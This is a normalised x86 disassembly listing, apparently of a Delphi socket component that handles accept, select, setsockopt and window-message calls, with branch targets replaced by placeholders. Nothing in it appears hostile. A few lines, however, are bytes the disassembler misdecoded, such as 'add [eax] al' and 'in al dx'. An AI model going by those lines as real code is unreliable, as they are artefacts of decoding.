mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
mov eax r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea eax [ ebp - 0x28 ]
push eax
push 0x2
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
sub_3ae3aec
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov edi eax
or ecx 0xffffffff
xor edx edx
mov eax edi
call sub_3ae394c
mov edx eax
mov eax esi
call sub_3a659c0
mov ebp [ esi ]
mov eax ebp
mov [ esp ] eax
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov edx ebp
mov ecx ebx
mov eax edi
call sub_3ae394c
mov edx eax
mov eax esi
call sub_3a659c0
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_3ae3b38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3ae3b62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ae3b67
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov ebx [ rw-data ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
sub_3ae3b8c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffff
je r-xdata
pop esi
pop ebx
retn
cmp eax edx
jne r-xdata
mov eax ebx
call sub_3ae3620
test al al
jne r-xdata
mov cl 0x6
mov edx ebx
mov eax ebx
mov si 0xffff
call sub_3a6457c
sub_3ae3bbc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_3ae3cee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x4 ]
cmp eax [ ebx + 0x2c ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae3cf5
lea eax [ ebp - 0x20 ]
call sub_3a652a0
retn
xor eax eax
mov [ ebx + 0x2c ] eax
movzx eax [ edi + 0xa ]
test ax ax
je r-xdata
movzx eax [ ebx + 0x29 ]
cmp al 0x1
jne r-xdata
movzx eax ax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov cl 0x6
mov edx ebx
mov eax ebx
mov si 0xfffe
call sub_3a6457c
mov edx [ ebx + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp al 0x2
jne r-xdata
mov eax [ ebx + 0x44 ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebx + 0x1c ] eax
mov eax [ ebx + 0x4c ]
push eax
movzx eax [ ebx + 0x50 ]
push eax
mov eax [ ebx + 0x54 ]
push eax
movzx eax [ ebx + 0x52 ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_3ae2ac8
jmp r-xdata
lea edx [ ebp - 0x20 ]
movzx eax [ edi + 0xa ]
call sub_3a6cae0
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
movzx eax [ edi + 0xa ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax r-xdata
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
jmp r-xdata
mov eax [ ebx + 0x44 ]
movzx eax [ eax + 0x8 ]
mov [ ebx + 0x1a ] ax
mov [ ebx + 0x50 ] 0x0
lea eax [ ebx + 0x4c ]
call sub_3a652a0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
push eax
movzx eax [ ebx + 0x52 ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_3ae2ac8
sub_3ae3d28
cmp dl [ eax + 0x58 ]
je r-xdata
retn
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
mov ecx edx
mov [ eax + 0x58 ] cl
cmp cl 0x1
jne r-xdata
movzx edx [ r-xdata ]
call sub_3ae3908
jmp r-xdata
movzx edx [ r-xdata ]
call sub_3ae3908
jmp r-xdata
sub_3ae3d7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x58 ] eax
test eax eax
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov ecx esi
xor edx edx
mov eax ebx
call sub_3ae29dc
mov eax [ ebx + 0x58 ]
movzx edx [ r-xdata ]
cmp dl [ eax + 0x28 ]
je r-xdata
mov edx ebx
call sub_3ae3f14
mov edi [ ebx + 0x58 ]
movzx eax [ r-xdata ]
cmp al [ edi + 0x28 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_3ae2f0c
mov [ ebx + 0x34 ] edi
mov [ ebx + 0x30 ] sub_3ae40a0
mov eax [ ebx + 0x58 ]
mov [ ebx + 0x3c ] eax
mov [ ebx + 0x38 ] sub_3ae40f4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov cl 0x2
mov edx ebx
mov eax ebx
mov si 0xffff
call sub_3a6457c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ae3e25
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x58 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3ae2a58
test bl bl
jle r-xdata
mov edx esi
call sub_3ae3f7c
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ae3e5c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ edi + 0x60 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ edi + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a90e0c
mov [ edi + 0x68 ] eax
mov ecx esi
xor edx edx
mov eax edi
call sub_3ae29dc
movzx eax [ r-xdata ]
mov [ edi + 0x28 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ae3ed1
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_3a6478c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3ae2a58
mov eax [ esi + 0x60 ]
call sub_3a64380
mov eax [ esi + 0x64 ]
call sub_3a64380
mov eax [ esi + 0x68 ]
call sub_3a64380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ae3f14
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_3a90e94
xor eax eax
push ebp
push sub_3ae3f6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
mov edx ebx
call sub_3a7a4f0
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae3f75
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_3a90e9c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
mov edx ebx
call sub_3a7a33c
sub_3ae3f7c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_3a90e94
xor eax eax
push ebp
push sub_3ae3fc5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
mov edx ebx
call sub_3a7a630
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae3fcc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_3a90e9c
retn
sub_3ae3fd0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_3a90e94
xor eax eax
push ebp
push sub_3ae403f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx ebx
call sub_3a7a4f0
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae4046
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_3a90e9c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx ebx
call sub_3a7a33c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x5c ]
jg r-xdata
mov [ ebx + 0x50 ] 0x1
sub_3ae404c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_3a90e94
xor eax eax
push ebp
push sub_3ae4095
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx ebx
call sub_3a7a630
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae409c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_3a90e9c
retn
sub_3ae40a0
push ebp
mov ebp esp
push esi
movzx edx [ ebp + 0x8 ]
sub dl 0x2
je r-xdata
mov edx ecx
mov si 0xfff7
call sub_3a6457c
jmp r-xdata
dec dl
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx ecx
mov si 0xfff6
call sub_3a6457c
jmp r-xdata
sub dl 0x3
je r-xdata
mov edx ecx
mov si 0xfff8
call sub_3a6457c
dec dl
je r-xdata
mov edx ecx
mov si 0xfff9
call sub_3a6457c
jmp r-xdata
jmp r-xdata
sub_3ae4110
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x7008
push 0xffff
push 0xffffffff
call getsockopt
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_3ae424e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebx + 0x58 ] 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
call accept
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0xc ] 0x20
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x7008
push 0xffff
push 0xffffffff
call setsockopt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x7008
push 0xffff
push 0xffffffff
call setsockopt
retn
mov edx eax
mov eax ebx
mov si 0xfffb
call sub_3a6457c
mov esi eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
cmp [ ebx + 0x58 ] 0x1
jne r-xdata
push 0x5
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
movzx edx [ r-xdata ]
mov eax esi
call sub_3ae3908
xor eax eax
push ebp
push j_sub_3a649cc#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
mov si 0xfffa
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_3ae41f7
add [ eax ] eax
add [ eax ] al
mov [ esi - 0x51bdfcfd ] es
add ecx [ ecx - 0x743c743d ]
adc eax r-xdata
call sub_3a6450c
test al al
jne r-xdata
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x7008
push 0xffff
push 0xffffffff
call setsockopt
retn
call sub_3a64c5c
sub_3ae425d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ae2d90
xor edx edx
push ebp
push sub_3ae436f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_3ae4352
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3ae4430
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x64 ]
cmp [ edi + 0x8 ] 0x0
jg r-xdata
mov eax edi
call sub_3a7a57c
mov ebx eax
mov [ ebx + 0xf ] 0x0
mov eax ebx
call sub_3a835b8
mov eax [ ebx + 0x4c ]
call sub_3a90df4
mov esi [ ebx + 0x40 ]
test esi esi
je r-xdata
jmp r-xdata
mov eax ebx
call sub_3a835c0
mov eax ebx
call sub_3a64380
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x60 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_3ae2d80
mov eax ebx
call sub_3a7a57c
call sub_3a64380
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ae3450
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_3a64380
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x6c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae4359
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3ae4430
retn
call sub_3a835b8
sub_3ae4390
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
push eax
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
cmp [ ebx + 0x58 ] 0x1
sete al
push eax
mov edx [ edx ]
mov ecx [ ecx ]
mov eax ebx
call sub_3ae3248
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
cmp [ ebx + 0x58 ] 0x1
jne r-xdata
push ebx
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ae46dc
mov [ ebx + 0x6c ] eax
sub_3ae43dc
cmp dl [ eax + 0x58 ]
je r-xdata
retn
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
mov ecx edx
mov [ eax + 0x58 ] cl
cmp cl 0x1
jne r-xdata
movzx edx [ r-xdata ]
call sub_3ae3908
jmp r-xdata
movzx edx [ r-xdata ]
call sub_3ae3908
jmp r-xdata
sub_3ae4430
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov edi eax
mov edi [ ebp - 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_3a90e9c
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x5c ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_3a90e94
xor edx edx
push ebp
push sub_3ae44bb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx ebx
call sub_3a7a494
cmp edi ebx
setg dl
mov [ eax + 0x50 ] dl
inc ebx
dec esi
jne r-xdata
sub_3ae44cc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
cmp [ ebx + 0x72 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
push ebx
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ae3d7c
mov [ esp ] eax
sub_3ae454c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_3a90e94
xor eax eax
push ebp
push sub_3ae45d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae45dd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_3a90e9c
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx ebx
call sub_3a7a494
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_3ae47ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx ebx
call sub_3a7a494
cmp [ eax + 0x40 ] 0x0
jne r-xdata
sub_3ae45dd
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x7a ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ ebp - 0xc ] eax
sub_3ae4640
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
cmp [ ebx + 0x58 ] 0x0
jne r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
pop esi
pop ebx
retn
mov eax esi
call sub_3ae2ef4
sub_3ae46b0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_3ae46dc
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x40 ] eax
xor edx edx
mov eax esi
call sub_3a830d4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ae4720
push ebx
push esi
mov ebx eax
jmp r-xdata
cmp [ ebx + 0xd ] 0x0
je r-xdata
mov esi [ ebx + 0x40 ]
mov edx [ esi + 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx ]
pop esi
pop ebx
retn
sub_3ae473c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
mov [ esi + 0xf ] 0x1
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a90db4
mov [ esi + 0x4c ] eax
mov cl 0x1
xor edx edx
mov eax esi
call sub_3a830d4
mov dl 0x4
mov eax esi
call sub_3a832e0
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_3ae47ec
test bl bl
jne r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
call sub_3a83590
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ae47b4
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_3a64380
mov eax [ esi + 0x4c ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a831a4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ae47ec
push ebx
mov ebx eax
mov eax edx
mov [ ebx + 0x40 ] eax
test eax eax
je r-xdata
pop ebx
retn
mov edx [ eax + 0x58 ]
mov [ ebx + 0x44 ] edx
mov eax edx
mov edx ebx
call sub_3ae3fd0
mov eax [ ebx + 0x40 ]
mov [ eax + 0x34 ] ebx
mov [ eax + 0x30 ] sub_3ae48c0
mov [ eax + 0x3c ] ebx
mov [ eax + 0x38 ] sub_3ae48d0
mov eax [ ebx + 0x4c ]
call sub_3a90df4
sub_3ae4828
push ebx
push esi
mov ebx eax
call GetCapture
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call __imp_SendMessageA
xor edx edx
call sub_3a6d22c
mov edx [ rw-data ]
cmp [ edx + 0x2 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ rw-data ]
mov edx eax
mov eax [ esi + 0x4 ]
call [ esi ]
pop esi
pop ebx
retn
sub_3ae490c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
call sub_3a62f64
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] ebx
xor eax eax
push ebp
push sub_3ae4967
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae496e
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x48 ] edx
retn
mov eax [ ebp - 0x4 ]
push eax
push sub_3ae4828
mov eax [ ebp - 0x4 ]
call sub_3a83568
sub_3ae4974
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov edx [ ebp - 0x4 ]
mov si 0xfffc
call sub_3a6457c
xor eax eax
push ebp
push sub_3ae4a0f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_3ae49d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3ae4ae8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ae4ac4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae4a16
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov edx [ ebp - 0x4 ]
mov si 0xfffd
call sub_3a6457c
retn
sub_3ae49db
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x50 ] 0x0
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae4a16
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov edx [ ebp - 0x4 ]
mov si 0xfffd
call sub_3a6457c
retn
sub_3ae4a1c
push ebx
push esi
push edi
add esp 0xfffffef4
mov ebx eax
lea esi [ esp + 0x8 ]
mov edi esp
jmp r-xdata
cmp [ ebx + 0xd ] 0x0
jne r-xdata
add esp 0x10c
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x40 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax esi
call sub_3ae17e4
mov edx esi
mov eax [ ebx + 0x40 ]
mov eax [ eax + 0x4 ]
call sub_3ae17d4
xor eax eax
mov [ edi ] eax
mov [ edi + 0x4 ] 0x1f4
push edi
push 0x0
push 0x0
push esi
push 0x0
call select
test eax eax
jle r-xdata
push edi
push 0x0
push esi
push 0x0
push 0x0
call select
test eax eax
jle r-xdata
cmp [ ebx + 0xd ] 0x0
jne r-xdata
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov edx esi
or ecx 0xffffffff
mov eax [ ebx + 0x40 ]
call sub_3ae394c
test eax eax
je r-xdata
push ebx
push sub_3ae48ac
mov eax ebx
call sub_3a83568
push ebx
push sub_3ae4874
mov eax ebx
call sub_3a83568
sub_3ae4ac4
push ebx
mov ebx eax
or edx 0xffffffff
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test al al
jne r-xdata
movzx eax [ ebx + 0xd ]
xor al 0x1
pop ebx
retn
mov eax [ ebx + 0x4c ]
call sub_3a90e00
sub_3ae4ae8
push ebx
mov ebx eax
mov eax [ ebx + 0x40 ]
call sub_3a64380
xor eax eax
mov [ ebx + 0x40 ] eax
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x50 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
sub_3ae4b88
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3ae4bfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_3a693f4
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae4c02
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x38 ]
mov edx [ ebp - 0x4 ]
call sub_3a652f4
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
sub_3ae4c08
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3ae4c7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_3a693f4
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae4c82
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x3c ]
mov edx [ ebp - 0x4 ]
call sub_3a652f4
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
sub_3ae4c88
cmp edx [ eax + 0x34 ]
je r-xdata
retn
test [ eax + 0x1c ] 0x1
jne r-xdata
